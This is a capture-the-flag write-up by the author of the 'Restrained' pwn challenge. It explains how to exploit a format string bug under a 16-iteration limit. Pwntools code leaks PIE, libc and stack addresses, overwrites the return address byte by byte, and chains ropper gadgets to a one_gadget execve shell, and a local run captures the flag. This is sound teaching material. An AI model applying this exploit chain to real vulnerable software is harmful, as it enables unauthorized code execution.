# **Restrained - Pwn Challenge Writeup**

## **Challenge Overview**

* **Category**: Pwn
* **Author**: [Spinel99](https://github.com/MedjberAbderrahim)
* **Synopsis**: A constrained format string challenge where you have exactly 16 iterations to leak addresses and perform arbitrary writes. The program reads input into a small buffer and prints it back using `printf(buffer)`, allowing format string exploitation. The twist? You're "restrained" by the iteration limit—requiring careful planning to leak PIE/libc, perform partial overwrites, and chain to a one_gadget for shell execution.

## **Environment**

* **Protections**:
```
pwndbg> checksec
pwndbg> checksec
Arch:       amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
Stripped:   No
```

All modern protections are enabled. Full RELRO means we can't overwrite GOT entries, PIE randomizes addresses, and stack canary protects against simple buffer overflows. However, the format string vulnerability gives us arbitrary read/write primitives.

## **Static Analysis**

The vulnerable function is straightforward:

```c
unsigned __int64 vuln(){
  int i; // [rsp+4h] [rbp-2Ch]
  ssize_t bytes_read; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  for ( i = 0; i <= 15; ++i )
  {
    bytes_read = read(0, buf, 0x18u);
    if ( bytes_read <= 0 || bytes_read == 1 && buf[0] == 10 )
      break;
    printf("[0x%02x / 0x%02x]: ", i, 16);
    printf(buf);
    putchar('\n');
  }
  return canary - __readfsqword(0x28u);
}
```

The program gives us exactly **16 iterations** to:
1. Leak addresses (PIE base, libc base, return address)
2. Overwrite the return address to redirect execution
3. Set up constraints for a one_gadget shell

## **Exploitation Strategy**

### **1. Leaking Addresses**

In general; fmt stuff needs addresses to work, so let's start by leaking some useful addresses.

On the first iteration, we use format string to leak three critical addresses from the stack:

```python
s = b'%12$p|%13$p|%17$p'
p.sendlinethen(f' / 0x{max_iterations:02x}]: '.encode(), s)
leak = p.recvline(drop=True).split(b'|')
ret_addr     = int(leak[0], 16) - 0x18
exe.address  = int(leak[1], 16) - 0x1333
libc.address = int(leak[2], 16) - 0x2a575
```

These *arbitrary* offsets can be examined using GDB, to know which is the appropriate offset:

- `%12$p`: Leaks a stack address (used to calculate return address location)
- `%13$p`: Leaks a PIE address (main+offset)
- `%17$p`: Leaks a LIBC address (__libc_start_call_main+offset)

This uses **1 iteration**, leaving us with **15 iterations** for writes.

> <u>**NOTE:**</u> We always try to minimize the operations, to free up iterations for further exploitation.

### **2. Conciseness is key**

each iteration reads up to 0x18 bytes:
```c
bytes_read = read(0, buf, 0x18u);
```

in fmt, we have to include addresses in order to write into arbitrary data, else we are bound with already existing relative offsets `%<OFF>$n`, with the fmt length:
```python
# xxx is number of spaces (0 - 255), to set the correct value with %hhn (0x00 - 0xFF)
len(b'%xxxc$%10$hhn') = 13
```

with 8 bytes for the address, 13 for the fmt; we have an obligatory 21 bytes for a single byte write, therefore we can overwrite 1 byte per iteration.

Therefore, we can change a total of 15 bytes, the fastest way to achieve shell is probably using `one_gadget`:

```sh
$ one_gadget libc.so.6
0xf8d09 execve("/bin/sh", rbp-0x50, r15)
constraints:
  address rbp-0x48 is writable
  r14 == NULL || {"/bin/sh", r14, NULL} is a valid argv
  [r15] == NULL || r15 == NULL || r15 is a valid envp

0x11d36a posix_spawn(rsp+0x74, "/bin/sh", [rsp+0x48], 0, rsp+0x80, [rsp+0x100])
constraints:
  [rsp+0x80] == NULL || {[rsp+0x80], [rsp+0x88], [rsp+0x90], [rsp+0x98], ...} is a valid argv
  [[rsp+0x100]] == NULL || [rsp+0x100] == NULL || [rsp+0x100] is a valid envp
  [rsp+0x48] == NULL || (s32)[[rsp+0x48]+0x4] <= 0

0x11d372 posix_spawn(rsp+0x74, "/bin/sh", [rsp+0x48], 0, rsp+0x80, r12)
constraints:
  [rsp+0x80] == NULL || {[rsp+0x80], [rsp+0x88], [rsp+0x90], [rsp+0x98], ...} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
  [rsp+0x48] == NULL || (s32)[[rsp+0x48]+0x4] <= 0

0x11d377 posix_spawn(rsp+0x74, "/bin/sh", rdx, 0, rsp+0x80, r12)
constraints:
  [rsp+0x80] == NULL || {[rsp+0x80], [rsp+0x88], [rsp+0x90], [rsp+0x98], ...} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
  rdx == NULL || (s32)[rdx+0x4] <= 0
```

Choosing the right gadget depends on environment, i.e. which conditions are already set, all with the goal of minimizing the ROP chain's length.

This is the registers' state at the `ret` in `vuln()`, i.e. Starting state of our ROP:
```sh
RAX  0
RBX  0
RCX  0x7f5f9b036790 (_IO_stdfile_1_lock) ◂— 0
RDX  0x7f5f9b036790 (_IO_stdfile_1_lock) ◂— 0
RDI  1
RSI  0x7f5f9b035643 (_IO_2_1_stdout_+131) ◂— 0x36790000000000a /* '\n' */
R8   1
R9   0
R10  0
R11  0x202
R12  0x7ffd649202f8 —▸ 0x7ffd649210b4 ◂— '/home/spinel99/...'
R13  1
R14  0
R15  0x555f89c1dda0 —▸ 0x555f89c1b180 ◂— endbr64
RBP  0x7ffd649201d0 —▸ 0x7ffd64920270 —▸ 0x7ffd649202d0 ◂— 0
RSP  0x7ffd649201b8 —▸ 0x555f89c1b30d ◂— xor r15, r15
RIP  0x555f89c1b27f ◂— ret
```

The most accessible ones are these:
```sh
0xf8d09 execve("/bin/sh", rbp-0x50, r15)
constraints:
  address rbp-0x48 is writable
  r14 == NULL || {"/bin/sh", r14, NULL} is a valid argv
  [r15] == NULL || r15 == NULL || r15 is a valid envp

0x11d372 posix_spawn(rsp+0x74, "/bin/sh", [rsp+0x48], 0, rsp+0x80, r12)
constraints:
  [rsp+0x80] == NULL || {[rsp+0x80], [rsp+0x88], [rsp+0x90], [rsp+0x98], ...} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
  [rsp+0x48] == NULL || (s32)[[rsp+0x48]+0x4] <= 0
```

I'll go with the `0xf8d09 execve("/bin/sh", rbp-0x50, r15)` one because we have a `R15` gadget conveniently laying around:
```sh
$ ropper --file chall
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

Gadgets
=======

0x0000000000001163: adc al, 0x48; mov eax, dword ptr [rip + 0x2e85]; test rax, rax; je 0x1178; jmp rax;
...
0x000000000000130d: xor r15, r15; ret;
```

### **3. Automating Address Overwrite**

To help automate the process, and not write byte per byte, we'll create a function:

```python
def fmt_write_addr(p: process, addr: int, value: int, iter_num: int = 6):
    for i in range(iter_num):
        p.sendthen(
            f' / 0x{max_iterations:02x}]: '.encode(),
            f'%{value & 0xFF if value > 0 else 256}c%10$hhn'.encode().ljust(0x10, b'a') + p64(addr)
        )
        addr += 1
        value >>= 8
```

It write byte per byte, as discussed before, `iter_num` is to know how much bytes to write of the address, this'll help us later with partial overwrites.

### **4. Finding Gadgets with Ropper**

Since we need to satisfy the one_gadget constraints, we hunt for useful gadgets:

```bash
$ ropper --file chall --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

[INFO] File: chall
0x000000000000130a: pop rdi; xor r15, r15; ret;
```

Perfect! The gadget at `0x130a` not only pops RDI but also **zeros r15**—exactly what we need for the one_gadget constraint `r15 == NULL`. This is why we chose the `0xf8d09` gadget: r14 is already NULL from the vuln() function, and we can satisfy r15 with this gadget.

### **5. Why Not `pwntools.fmtstr_payload`?**

I tried solving the challenge with `fmtstr_payload`, but it kept using `%lln` (8-byte writes) for arbitrary memory writes. This is problematic for our challenge because:

- `%lln` writes **all 8 bytes** of a pointer at once
- We need **partial overwrites** (1 byte at a time) to minimize iterations
- A full 8-byte write uses ~21 bytes of format string, leaving only 3-5 bytes for control

After some time of fighting through docs, AI, and debugging, I was like "what the hell man let's just manually do it, the old way", so I created a function which uses `%hhn` (1-byte writes) to write values byte-by-byte:

```python
def fmt_write_addr(p: process, addr: int, value: int, iter_num: int = 6):
    for i in range(iter_num):
        p.sendthen(
            f' / 0x{max_iterations:02x}]: '.encode(),
            f'%{value & 0xFF if value > 0 else 256}c%10$hhn'.encode().ljust(0x10, b'a') + p64(addr)
        )
        addr += 1
        value >>= 8
```

This custom function:
- Uses `%Nc` to pad the output to `value & 0xFF` bytes
- Uses `%10$hhn` to write 1 byte to the 10th stack parameter (our controlled address)
> <u>**NOTE:**</u> I confirmed the appended pointer is read as arg 10 by sending %10$p and observing it prints the appended address.
- Loops `iter_num` times, writing one byte per iteration
- Allows us to write 1, 6, or 8 bytes as needed

### **6. Building the ROP Chain**

We overwrite three consecutive return addresses on the stack:

```python
# Iteration 0: Leak addresses
# Iteration 1: Partial Overwrite
fmt_write_addr(p, ret_addr + 0x00, (exe.address + 0x130a) & 0xFF, 1)  # 1 iteration (partial)
#   -> Overwrites lowest byte to redirect to gadget at 0x130a
#   -> Since Addresses are linux page aligned (0x1000), the 3 last hex digits (12 bits) don't change

# Iterations 2-7: Write ret gadget for alignment
fmt_write_addr(p, ret_addr + 0x08, rop.ret.address, 6)  # 6 iterations
#   -> Full 8-byte address (8 bytes total, but padded to 21 bytes per iteration)
#   -> Stack alignment required for the system call

# Iterations 8-15: Write one_gadget address
fmt_write_addr(p, ret_addr + 0x10, libc.address + 0xf8d09, 8)  # 8 iterations
#   -> Full 8-byte one_gadget address
#   -> Executes execve("/bin/sh", ...) with satisfied constraints
```

> <u>**NOTE:**</u> For the second overwrite, overwriting 6 bytes is enough, as addresses only use 48-bits, i.e. 6 bytes, so no need to waste bytes on already zero'd out bytes

> <u>**NOTE:**</u> For the third overwrite, we overwrote the entirety of the 8 bytes because the original value of the address was fully occupied (it had some garbage), so the previous trick doesn't work

**Iteration Budget: 1 (leak) + 1 (partial) + 6 (ret) + 8 (one_gadget) = 16 total** ✓

The execution flow when `vuln()` returns:
1. **0x130a gadget**: Pops garbage into RDI, zeros r15, returns to next address
2. **ret gadget**: Aligns stack (required for libc functions)
3. **one_gadget at 0xf8d09**: Executes `execve("/bin/sh", rbp-0x50, r15)`
   - r14 = NULL ✓ (set by `xor %r14, %r14` in vuln())
   - r15 = NULL ✓ (set by our gadget)
   - Stack writable ✓ (always true)
4. Shell spawned!

## **Solve Script**

The full solver is provided in [`exploit.py`](./exploit.py).

## **Proof of Concept**

Running locally:
```sh
spinel99@Spinel99-PC:~/CTFs/Author/HackingHub/SnykCTF/pwn/Restrained/solve$ ./exploit.py REMOTE
[!] Did not find any GOT entries
[+] Opening connection to localhost on port 10002: Done
return addr:  0x7ffc18a45dc8
exe.address:  0x55e01e972003
libc.address: 0x7f0c69775000
[*] Switching to interactive mode
flag{n0_l1m1ts_c4nt_h0ld_m3_b4ck_ff1879}$ 
[*] Interrupted
[*] Closed connection to localhost port 10002
```

## **Final Notes**

Got inspiration for this challenge from a previously solved fmt chall, where we needed to write shellcode using fmt, and then jump to it, so I thought "why not force them to ROP using fmt ?", but that's just too easy, isn't it ?

so I put as heavy restrictions as I could, in order to make crafting the ROP chain as accurate and intricate of a task as possible, you don't want to waste your iterations on useless stuff!

Anyway, hope y'all found this challenge good, either you learnt something new from it, or found it fun & entertaining! see you next time hopefully, meanwhile, happy pwning!